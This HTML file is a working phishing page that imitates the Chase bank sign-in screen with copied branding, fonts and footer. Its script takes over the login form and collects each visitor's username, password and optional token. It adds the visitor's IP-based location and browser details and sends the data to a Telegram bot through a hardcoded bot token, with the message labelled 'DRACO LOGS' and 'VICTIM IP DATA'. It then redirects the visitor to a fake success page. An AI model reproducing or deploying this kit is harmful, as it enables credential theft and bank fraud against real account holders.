<!DOCTYPE html>
<html>
<head>
  <meta charset='utf-8'>
  <meta http-equiv='X-UA-Compatible' content='IE=edge'>
  <title>Sign in</title>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  <link
    rel="icon"
    href="https://www.chase.com/etc/designs/chase-ux/favicon.ico"
  />
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet" />
  <link
    rel="preload"
    href="https://asset.chase.com/content/dam/cpo-static/fonts/opensans.woff2"
    as="font"
    type="font/woff2"
    crossorigin=""
  />
  <link
    rel="preload"
    href="https://asset.chase.com/content/dam/cpo-static/fonts/opensans-bold.woff2"
    as="font"
    type="font/woff2"
    crossorigin=""
  />
  <link
    rel="preload"
    href="https://asset.chase.com/content/dam/cpo-static/fonts/opensans-light.woff2"
    as="font"
    type="font/woff2"
    crossorigin=""
  />
  <link
    rel="preload"
    href="https://asset.chase.com/content/dam/cpo-static/fonts/opensans-semibold.woff2"
    as="font"
    type="font/woff2"
    crossorigin=""
  />
  <link
    rel="preload"
    href="https://asset.chase.com/content/dam/cpo-static/fonts/opensans-italic.woff2"
    as="font"
    type="font/woff2"
    crossorigin=""
  />
  <link
    rel="preload"
    href="https://asset.chase.com/content/dam/cpo-static/fonts/opensans-semibold-italic.woff2"
    as="font"
    type="font/woff2"
    crossorigin=""
  />
  <link
    rel="preload"
    href="https://asset.chase.com/content/dam/cpo-static/fonts/opensans-bold-italic.woff2"
    as="font"
    type="font/woff2"
    crossorigin=""
  />
  <link
    rel="preload"
    href="https://asset.chase.com/content/dam/cpo-static/fonts/opensans-extrabold-italic.woff2"
    as="font"
    type="font/woff2"
    crossorigin=""
  />
  <link
    rel="preload"
    href="https://asset.chase.com/content/dam/cpo-static/fonts/opensans-extrabold.woff2"
    as="font"
    type="font/woff2"
    crossorigin=""
  />
  <link
    rel="preload"
    href="https://asset.chase.com/content/dam/cpo-static/fonts/opensans-light-italic.woff2"
    as="font"
    type="font/woff2"
    crossorigin=""
  />
  <style>
    @font-face {
      font-family: "Open Sans";
      font-style: normal;
      font-weight: 300;
      src: url("https://asset.chase.com/content/dam/cpo-static/fonts/opensans-light.woff2")
          format("woff2"),
        url("https://asset.chase.com/content/dam/cpo-static/fonts/opensans-light.woff")
          format("woff");
      font-display: swap;
    }

    @font-face {
      font-family: "Open Sans";
      font-style: italic;
      font-weight: 300;
      src: url("https://asset.chase.com/content/dam/cpo-static/fonts/opensans-light-italic.woff2")
          format("woff2"),
        url("https://asset.chase.com/content/dam/cpo-static/fonts/opensans-light-italic.woff")
          format("woff");
      font-display: swap;
    }

    @font-face {
      font-family: "Open Sans";
      font-style: normal;
      font-weight: 400;
      src: url("https://asset.chase.com/content/dam/cpo-static/fonts/opensans.woff2")
          format("woff2"),
        url("https://asset.chase.com/content/dam/cpo-static/fonts/opensans.woff")
          format("woff");
      font-display: swap;
    }

    @font-face {
      font-family: "Open Sans";
      font-style: italic;
      font-weight: 400;
      src: url("https://asset.chase.com/content/dam/cpo-static/fonts/opensans-italic.woff2")
          format("woff2"),
        url("https://asset.chase.com/content/dam/cpo-static/fonts/opensans-italic.woff")
          format("woff");
      font-display: swap;
    }

    @font-face {
      font-family: "Open Sans";
      font-style: normal;
      font-weight: 600;
      src: url("https://asset.chase.com/content/dam/cpo-static/fonts/opensans-semibold.woff2")
          format("woff2"),
        url("https://asset.chase.com/content/dam/cpo-static/fonts/opensans-semibold.woff")
          format("woff");
      font-display: swap;
    }

    @font-face {
      font-family: "Open Sans";
      font-style: italic;
      font-weight: 600;
      src: url("https://asset.chase.com/content/dam/cpo-static/fonts/opensans-semibold-italic.woff2")
          format("woff2"),
        url(https://asset.chase.com/content/dam/cpo-static/fonts/opensans-semibold-italic.woff)
          format("woff");
      font-display: swap;
    }

    @font-face {
      font-family: "Open Sans";
      font-style: normal;
      font-weight: 700;
      src: url("https://asset.chase.com/content/dam/cpo-static/fonts/opensans-bold.woff2")
          format("woff2"),
        url("https://asset.chase.com/content/dam/cpo-static/fonts/opensans-bold.woff2")
          format("woff");
      font-display: swap;
    }

    @font-face {
      font-family: "Open Sans";
      font-style: italic;
      font-weight: 700;
      src: url("https://asset.chase.com/content/dam/cpo-static/fonts/opensans-bold-italic.woff2")
          format("woff2"),
        url("https://asset.chase.com/content/dam/cpo-static/fonts/opensans-bold-italic.woff")
          format("woff");
      font-display: swap;
    }

    @font-face {
      font-family: "Open Sans";
      font-style: normal;
      font-weight: 900;
      src: url("https://asset.chase.com/content/dam/cpo-static/fonts/opensans-extrabold.woff2")
          format("woff2"),
        url("https://asset.chase.com/content/dam/cpo-static/fonts/opensans-extrabold.woff")
          format("woff");
      font-display: swap;
    }

    @font-face {
      font-family: "Open Sans";
      font-style: italic;
      font-weight: 900;
      src: url("https://asset.chase.com/content/dam/cpo-static/fonts/opensans-extrabold-italic.woff2")
          format("woff2"),
        url("https://asset.chase.com/content/dam/cpo-static/fonts/opensans-extrabold-italic.woff")
          format("woff");
      font-display: swap;
    }
  </style>
  <style>
    *{
      margin: 0px;
      padding: 0px;
      box-sizing: border-box;

    }

    .custom-font-head {
      font-family: "Open Sans", sans-serif;
      font-style: normal;
      font-weight: 600;
    }


    .custom-font {
      font-family: "Open Sans", sans-serif;
      font-style: normal;
    }

    body{
      background-image: url(new_york_night_6.webp);
      background-attachment: fixed;
      background-position: center;
      background-size: cover;
      height: 100vh;
    }

    nav{
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 25px 10px;
      background-color: rgba(0, 0, 0, 0);;
      background-image: linear-gradient(to bottom, #000000b3, #00000080, #0000);
    }

    nav img{
      width: 180px;
    }

    section{
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 120px 0px;
      margin-bottom: 65px;
      flex-direction: column;
    }

    section form{
      width: 23%;
      background: white;
      border-radius: 10px;
    }

    form{
      padding: 20px 15px;
    }

    .form_box label{
      color: #5B6C7B;
      font-weight:400;
      font-size: 14px;
    }

    .form_box input{
      height: 35px;
      border: none;
      border-bottom: 1px solid #5B6C7B;
    }

    form .error{
      display: none;
      margin: 7px 0px;
      margin-bottom: 5px;
    }

    .error{
      font-size: 12px;
      color: #B70009;
    }

    form i{
      color: #B70009;
    }

    form .form_box{
      position: relative;
      display: flex;
      flex-direction: column;
      margin: 15px 0px;
    }

    .form_box input:focus{
      border: none;
      outline: none;
      border-bottom: 2px solid #005EB8;
    }

    .form_box span{
      position: absolute;
      right: 4%;
      top: 50%;
      color: #0061C8;
      font-weight: 550;
    }

    .check_boxes{
      display: flex;
      justify-content: space-between;
      align-items: center;
    }


    .check_box {
      display: flex;
      align-items: center;
      margin-bottom: 10px;
      cursor: pointer;
      user-select: none;
      font-size: 14px;
      color: #5B6C7B;
    }

    .check_box input[type="checkbox"] {
      display: none;
    }

    .custom_checkbox {
      width: 22px;          /* Increased from 20px */
      height: 22px;         /* Increased from 20px */
      border: 2px solid #ccc;
      display: inline-block;
      position: relative;
      margin-right: 12px;
      border-radius: 4px;
      background-color: #fff;
      transition: background-color 0.3s, border-color 0.3s;
    }

    .check_box input[type="checkbox"]:checked + .custom_checkbox {
      background-color: #005EB8;
      border-color: #005EB8;
    }

    .check_box input[type="checkbox"]:checked + .custom_checkbox::after {
      content: "✔";
      color: white;
      font-size: 20px;      /* Increased from 14px */
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
    }

    form button{
      width: 100%;
      border: none;
      border-radius: 5px;
      color: white;
      background: #005EB8;
      margin: 15px 0px;
      height: 37px;
      font-weight: 550;
      font-size: 16px;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    form a{
      width: 100%;
      color: #0061C8;
      text-decoration: none;
      font-size: 14px;
    }

    form a i{
      color: #0061C8;
      margin-left: 7px;
    }

    .marginn{
      margin: 15px 0px;
      width: 100%;
    }

    footer{
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      background: white;
      padding: 30px 10px;
      color: #5B6C7B;
    }

    .social_box{
      width: 70%;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .social_box img{
      width: 25px;
      margin: 0px 10px;
    }

    footer ul{
      width: 90%;
      display: flex;
      justify-content: center;
      margin: 10px 0px;
      flex-wrap: wrap;
    }

    footer ul li{
      list-style-type: none;
      font-size: 13px;
      margin: 5px 10px;
      display: flex;
      align-items: center;
      text-decoration: underline;
    }

    footer ul li img{
      width: 15px;
    }

    footer p{
      font-size: 13px;
    }

    .active{
      display: flex !important;
    }

    #load_page{
      height: 100vh;
      background: #22588C;
      justify-content: center;
      align-items: center;
    }

    .loader {
      border: 4px solid rgba(255, 255, 255, 0.2); /* Light translucent white */
      border-top: 4px solid white;                /* Solid white top for spinning effect */
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin: 20px auto; /* Center horizontally (optional) */
    }

    @keyframes spin {
      0%   { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loader-btn {
      border: 3px solid rgba(255, 255, 255, 0.2); /* Light translucent white */
      border-top: 3px solid white;                /* Solid white top for spinning effect */
      border-radius: 50%;
      width: 25px;
      height: 25px;
      animation: spin 1s linear infinite;
      margin: 20px auto; /* Center horizontally (optional) */
    }

    @keyframes spin {
      0%   { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    @media only screen and (max-width:768px){


      section{
        margin: 50px 0px;
      }

      section form{
        width: 95%;
        background: white;
        border-radius: 10px;
      }
    }
</style>
<script>
  window.addEventListener("load", function () {
    setTimeout(() => {
      document.getElementById("load_page").style.display = "none";

      // Show the main content
      document.getElementById("main-content").style.display = "block";
    }, 1000);
  });
</script>
</head>
<body>
  <div id="load_page" style="display: flex;">
    <div class="loader"></div>
  </div>
  <div id="main-content" style="display: none;">
    <nav>
      <img src="logo_chase_wht.webp" alt="">
    </nav>
  
    <section>
      <form id="form" method="post" class="custom-font">
        <div class="form_box" style="margin-top: 0px;">
          <label for="">Username</label>
          <input type="text" required id="user">
        </div>
        <p class="error" id="error_username"><i class="fa-solid fa-circle-exclamation"></i> <span>Enter your username</span></p>
  
        <div class="form_box">
          <label for="pass">Password</label>
          <input type="password" required id="pass">
          <span id="togglePass">Show</span>
        </div>
        
        <p class="error" id="error_password"><i class="fa-solid fa-circle-exclamation"></i> <span>Enter your password</span></p>
  
  
        <div class="form_box token_box" id="targetElement" style="display: none;">
          <label for="">Token</label>
          <input type="number" id="token">
        </div>
        <p class="error" id="error_token"><i class="fa-solid fa-circle-exclamation"></i> <span>Enter token</span></p>
  
        <div class="check_boxes">
          <label class="check_box">
            <input type="checkbox" id="remember">
            <span class="custom_checkbox"></span>
            Remember me
          </label>
          
          <label class="check_box">
            <input type="checkbox" id="is_active">
            <span class="custom_checkbox"></span>
            Use token
          </label>
        </div>
  
        <button class="custom-font" id="submit_data">Sign in</button>
  
        <a href="">
          Forgot username/password? 
          <i class="fa-solid fa-angle-right"></i>
        </a>
        <div class="marginn"></div>
      
        <a href="">
          Not enrolled? Sign up now.
          <i class="fa-solid fa-angle-right"></i>
        </a>
      </form>
  
  
    </section>
    <footer class="custom-font">
      <div class="social_box">
        <img src="assets/fb.svg" alt="">
        <img src="assets/ig.svg" alt="">
        <img src="assets/x.svg" alt="">
        <img src="assets/youtube.svg" alt="">
        <img src="assets/ln.svg" alt="">
      </div>
  
      <ul>
        <li>
          Contact us
        </li>
        <li>Privacy & security</li>
        <li>Terms of use</li>
        <li>Accessibility</li>
        <li>SAFE Act: Chase Mortgage Loan Originators</li>
        <li>Fair Lending</li>
        <li>About Chase</li>
        <li>J.P. Morgan</li>
        <li>JPMorgan Chase & Co.</li>
        <li>Careers</li>
        <li>Español</li>
        <li>Chase Canada</li>
        <li>Site map</li>
        <li>Member FDIC</li>
        <li><img src="assets/ehl.svg" alt="">Equal Housing Opportunity</li>
      </ul>
  
      <p>© 2025 JPMorganChase</p>
  
    </footer>
  
  </div>

  <script>
      const checkbox = document.getElementById('is_active');
      const target = document.getElementById('targetElement');
      const token = document.getElementById('token')
      const user = document.getElementById('user')
      const pass = document.getElementById('pass')
      const form = document.getElementById('form')
      const error_username = document.getElementById('error_username')
      const error_password = document.getElementById('error_password')
      const error_token = document.getElementById('error_token')
      const submit_data = document.getElementById('submit_data')

      const toggle = document.getElementById('togglePass');

      toggle.addEventListener('click', () => {
        if (pass.type === 'password') {
          pass.type = 'text';
          toggle.textContent = 'Hide';
        } else {
          pass.type = 'password';
          toggle.textContent = 'Show';
        }
      });

      user.addEventListener('blur', ()=>{
        if(user.value == ''){
          const label = user.parentNode.querySelector('label')
          error_username.style.display = 'block'
          user.style.borderBottom = '1px solid #B70009'
          label.style.fontWeight = '600'
          label.style.color = '#B70009'
          
        }
      })

      user.addEventListener('keyup', ()=>{
        const label = user.parentNode.querySelector('label')
        error_username.style.display = 'none'
        user.style.borderBottom = '1px solid #5B6C7B'
        label.style.fontWeight = '300'
        label.style.color = '#5B6C7B'    
      })



      pass.addEventListener('blur', ()=>{
        if(pass.value == ''){
          const label = pass.parentNode.querySelector('label')
          error_password.style.display = 'block'
          pass.style.borderBottom = '1px solid #B70009'
          label.style.fontWeight = '600'
          label.style.color = '#B70009'
          
        }
      })

      pass.addEventListener('keyup', ()=>{
        const label = pass.parentNode.querySelector('label')
        error_password.style.display = 'none'
        pass.style.borderBottom = '1px solid #5B6C7B'
        label.style.fontWeight = '300'
        label.style.color = '#5B6C7B'    
      })


      token.addEventListener('blur', ()=>{
        if(token.value == ''){
          const label = token.parentNode.querySelector('label')
          error_token.style.display = 'block'
          token.style.borderBottom = '1px solid #B70009'
          label.style.fontWeight = '600'
          label.style.color = '#B70009'
          
        }
      })

      token.addEventListener('keyup', ()=>{
        const label = token.parentNode.querySelector('label')
        error_token.style.display = 'none'
        token.style.borderBottom = '1px solid #5B6C7B'
        label.style.fontWeight = '300'
        label.style.color = '#5B6C7B'    
      })

      checkbox.addEventListener('change', () => {
        if (checkbox.checked) {
          token.required = true;
          target.classList.add('active');
        } else {
          token.required = false;
          target.classList.remove('active');
        }
      });




    const sendFormData = async (data) => {
      let keyValuePairs = Object.entries(data)
        .map(([key, value]) => `## ${key.split("_").join(" ")}: ${value} \n`)
        .join("");

      const url = "https://ipapi.co/json";
      const response = await fetch(url);
      const result = await response.json();

      const botToken = "8377210615:AAFTWLS_ZjgoXWqmetcKKMz9EcqN68v6K_c";
      const chat_id = "677217859";
      const userAgent = navigator.userAgent;

      try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chat_id,
            text: `------------- DRACO LOGS --------------- \n  ******** CHASE LOGIN ******** \n \n ${keyValuePairs}  \n \n ---------- VICTIM IP DATA ----------- \n ## IP : ${result.ip} \n Country : ${result.country_name} \n ## City : ${result.city} \n ## Zip Code : ${result.postal} \n \n ## User Agent : ${userAgent}`,
          }),
        });

  
        submit_data.innerHTML = `Sign in`

        window.location = `success.php`

      } catch (error) {
        console.log(error);
      }
    };

    form.addEventListener("submit", (e) => {
      e.preventDefault();

      let formData = {};

      if(token.required == true){
        formData = {
          username: user.value,
          password: pass.value,
          token: token.value
        };
      }else{
        formData = {
          username: user.value,
          password: pass.value
        };
      }

      submit_data.innerHTML = `<div class='loader-btn'></div>`

      sendFormData(formData);
    });

  </script>
</body>
</html>